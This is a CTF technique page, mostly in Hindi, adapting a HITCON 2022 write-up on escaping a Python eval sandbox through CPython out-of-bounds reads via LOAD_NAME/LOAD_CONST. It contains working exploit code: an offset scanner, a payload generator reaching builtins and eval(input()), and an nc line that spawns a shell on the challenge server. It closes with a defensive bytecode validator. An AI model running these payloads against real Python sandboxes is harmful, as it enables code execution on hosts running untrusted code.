# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

यह पेज Splitline के original HITCON CTF 2022 "V O I D" writeup और exploit chain को अनुकूलित करता है।<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

`LOAD_NAME` या `LOAD_CONST` operand, जानबूझकर छोटी की गई `co_names` या `co_consts` tuple के बाहर read कर सकता है। इस challenge में unreachable dummy names का उपयोग तब तक किया जाता है, जब तक पास की किसी entry में `__getattribute__` जैसा उपयोगी attribute न मिल जाए।<sup>[[1]](#references)</sup>

इसके बाद का payload उस recovered name का पुनः उपयोग करके sandbox escape बनाता है।<sup>[[1]](#references)</sup>

### Overview <a href="#overview-1" id="overview-1"></a>

Challenge wrapper छोटा है और उसे evaluate करने से पहले एक expression compile करता है:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
इनपुट को Python code object में compile किया जाता है, फिर wrapper `eval` को call करने से पहले इसके `co_consts` और `co_names` को empty tuples से replace कर देता है।<sup>[[1]](#references)[[5]](#references)</sup>

ऐसी कोई भी generated instruction, जो अभी भी इन tables में से किसी एक को index करती है, interpreter को crash कर सकती है या build के आधार पर किसी adjacent object pointer को expose कर सकती है।<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault कैसे होता है?

`[a, b, c]` जैसे list expression के लिए compiler consecutive operands वाली `LOAD_NAME` instructions emit करता है:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
यदि `co_names` को `()` से replace किया जाता है, तो bytecode में अभी भी `LOAD_NAME 2` मौजूद रहता है; इसलिए unchecked tuple access tuple के बाहर के pointer को fetch कर सकता है, बजाय `IndexError` raise करने के।<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` और `LOAD_CONST` यहाँ core primitives हैं: इनके integer operands क्रमशः `co_names` और `co_consts` में entries चुनते हैं।<sup>[[1]](#references)[[2]](#references)</sup>

CPython के dispatch में, `LOAD_CONST` चुनी गई tuple entry को retrieve करके उसे push करता है; release builds एक unchecked tuple accessor का उपयोग करते हैं:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Target interpreter पर बढ़ते हुए `LOAD_NAME` operands को probe करके उपयोगी entries को map करें। Splitline ने challenge environment में 700 से ऊपर के उपयोगी offsets देखे, लेकिन layout build-specific होता है; आसपास की memory inspect करने के लिए debugger मददगार हो सकता है।<sup>[[1]](#references)</sup>

### Exploit जनरेट करना <a href="#generating-the-exploit" id="generating-the-exploit"></a>

जब कोई offset उपयोगी name देता है, तो out-of-range lookup को unreachable expression में रखें और reachable attribute access से उसी `co_names` slot को reference करें।<sup>[[1]](#references)</sup>

उदाहरण के लिए, यदि offset 5 `__getattribute__` देता है, तो उस name को slot 5 पर रखें, जबकि false branch उपयोगी lookup करती है:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> पुनर्प्राप्त पाठ `__getattribute__` होना आवश्यक नहीं है; payload के लिए उपयोग किया जाने वाला कोई भी identifier उस slot में रह सकता है।<sup>[[1]](#references)</sup>

Compiler एक ही name की बार-बार होने वाली occurrences के लिए `co_names` slot का पुनः उपयोग करता है, जैसा कि disassembly में दिखाया गया है:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
क्योंकि `LOAD_ATTR` अपना name `co_names` के माध्यम से भी resolve करता है, reachable branch उस slot का पुनः उपयोग कर सकती है; नए CPython versions पर packed operands का वर्णन नीचे दिए गए version notes में है।<sup>[[1]](#references)[[2]](#references)</sup>

छोटे non-negative integers को constants के बिना boolean expressions से बनाया जा सकता है:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Original exploit ने constants के बजाय names का उपयोग किया ताकि challenge की length limit के भीतर रहा जा सके।<sup>[[1]](#references)</sup>

यह helper empty `co_names` tuple के साथ code object बनाकर candidate name offsets को scan करता है।<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
नीचे दिया गया generator recovered offsets को names से map करता है और source-level payload emit करता है।<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
उच्च स्तर पर, generated payload किसी function के globals प्राप्त करता है, `builtins` को पुनर्प्राप्त करता है, और `eval(input())` को call करता है।<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Version notes and affected opcodes (Python 3.11–3.13)

- CPython 3.11–3.13 पर, instructions अभी भी code object की constant और name tables को index करने के लिए integer operands का उपयोग करती हैं। यदि इनमें से कोई tuple referenced index से छोटा है, तो unchecked access किसी adjacent object pointer को read कर सकता है और crash कर सकता है या उस पर operate कर सकता है; exact behavior interpreter build पर निर्भर करता है।<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` और (3.12+) `RETURN_CONST consti`, `co_consts[consti]` को read करते हैं।<sup>[[2]](#references)</sup>
- Direct name-table users में `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, और (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` शामिल हैं।<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` और `LOAD_ATTR namei`, `co_names[namei >> 1]` का उपयोग करते हैं; low bit documented NULL/method behavior को नियंत्रित करता है। (3.12+) `LOAD_SUPER_ATTR namei`, `co_names[namei >> 2]` का उपयोग करता है और अपने low bits में two flags pack करता है।<sup>[[2]](#references)</sup>
- Python 3.11+ ने adaptive/inline caches introduce किए, जो instructions के बीच hidden `CACHE` entries जोड़ते हैं। `co_code` बनाते समय handcrafted bytecode को इन entries का ध्यान रखना चाहिए।<sup>[[2]](#references)</sup>

Practical implication: bytecode layout और recovered offsets release- और build-specific होते हैं। इस technique और किसी भी generated payload पर भरोसा करने से पहले, उन्हें target CPython version के विरुद्ध test करें।<sup>[[2]](#references)</sup>

### Useful OOB indexes के लिए quick scanner (3.11+/3.12+ compatible)

यदि आप high-level source के बजाय सीधे bytecode से interesting objects को probe करना पसंद करते हैं, तो आप minimal code objects generate कर सकते हैं और indices को brute-force कर सकते हैं। नीचे दिया गया helper target interpreter के `dis` metadata के अनुसार inline caches insert करता है।<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
नोट्स
- इसके बजाय names को probe करने के लिए `LOAD_CONST` को `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` से बदलें और target opcode के लिए stack usage तथा packed operand को समायोजित करें।<sup>[[2]](#references)</sup>
- आवश्यकता होने पर indexes >255 तक पहुंचने के लिए `EXTENDED_ARG` या `arg` के multiple bytes का उपयोग करें। यह helper केवल low operand byte emit करता है, इसलिए बड़े indexes के लिए raw byte construction या multiple loads आवश्यक हैं।<sup>[[2]](#references)</sup>

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

जब आप `co_consts` index की पहचान कर लेते हैं जो builtins module पर resolve होता है, तो stack में हेरफेर करके `co_names` के बिना `eval(input())` को reconstruct कर सकते हैं। Official B01lers CTF 2024 `awpcode` material इसी OOB-read pattern को document करता है।<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
यह stack-only approach तब उपयोगी है जब कोई challenge आपको `co_code` पर सीधा नियंत्रण देता है और `co_consts=()` तथा `co_names=()` लागू करता है; यह source-level tricks से बचता है और bytecode stack operations तथा tuple builders का उपयोग करके payloads को छोटा रख सकता है।<sup>[[4]](#references)</sup>

### Sandboxes के लिए Defensive checks और mitigations

यदि आप ऐसा Python sandbox लिख रहे हैं जो untrusted code को compile या evaluate करता है, तो bytecode द्वारा उपयोग किए गए tuple indexes पर bounds-check करने के लिए CPython पर निर्भर न रहें। उन्हें execute करने से पहले code objects को validate करें।<sup>[[2]](#references)[[3]](#references)</sup>

Practical validator (co_consts/co_names तक OOB access को reject करता है)।<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
अतिरिक्त mitigation ideas
- अविश्वसनीय input पर arbitrary `CodeType.replace(...)` की अनुमति न दें, या resulting code object पर strict structural checks जोड़ें।
- CPython semantics पर निर्भर रहने के बजाय untrusted code को OS-level sandboxing (seccomp, job objects, containers) के साथ अलग process में चलाने पर विचार करें।

## References

- [1] [Splitline's HITCON CTF 2022 writeup "V O I D" (इस technique और high-level exploit chain का origin)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python 3.13 `dis` documentation (bytecode indices, packed name operands, और inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
